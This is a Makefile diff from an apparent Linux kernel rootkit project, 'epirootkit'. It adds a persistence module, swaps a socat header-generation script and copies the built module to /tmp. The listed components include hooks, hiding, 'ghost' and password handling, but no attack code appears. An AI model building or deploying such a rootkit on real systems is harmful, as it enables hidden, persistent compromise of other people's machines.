@@ -12,6 +12,7 @@ ccflags-y := 								    \
     -I$(src)/passwd 				            \
     -I$(src)/utils/io 					        \
     -I$(src)/utils/ulist 				        \
+    -I$(src)/persist     				        \
     -I$(src)/utils/crypto                             
 
 obj-m    := epirootkit.o
@@ -43,14 +44,16 @@ epirootkit-objs :=                              \
     interceptor/hooks/hide/hide_api.o           \
     interceptor/misc/ghost.o                    \
     utils/io/io.o                               \
+    utils/ulist/ulist.o                         \
     passwd/passwd.o                             \
-    utils/ulist/ulist.o
+    persist/persist.o
 
 all: modules
 
 modules:
-	@./scripts/generate_socat_h.sh
+	@./scripts/generate.sh
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
+	@cp epirootkit.ko /tmp/epirootkit.ko
 
 clean:
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) clean
